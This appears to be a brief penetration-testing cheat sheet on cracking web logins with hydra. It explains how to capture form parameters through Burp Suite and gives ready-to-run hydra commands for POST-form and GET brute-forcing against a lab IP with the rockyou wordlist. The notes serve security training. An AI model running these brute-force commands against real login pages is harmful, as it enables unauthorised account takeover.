#### HTTP Login Cracking

let's user hydra to try to brute force http form logins

For cracking user logins we can turn on burpsuite and enable intercept mode

from here we can capture a user login to get the required post arguments needed for hydra

#### http-post

    $ hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.50 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

we pass the user or user list then the password or password list to hydra with the 3 arguments the uri page, the form arguments, and then a response message indicating a failed attempt

for the response message we do not want to include commonly recognized words like password or user

#### http-get

    $ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.50.50 http-get
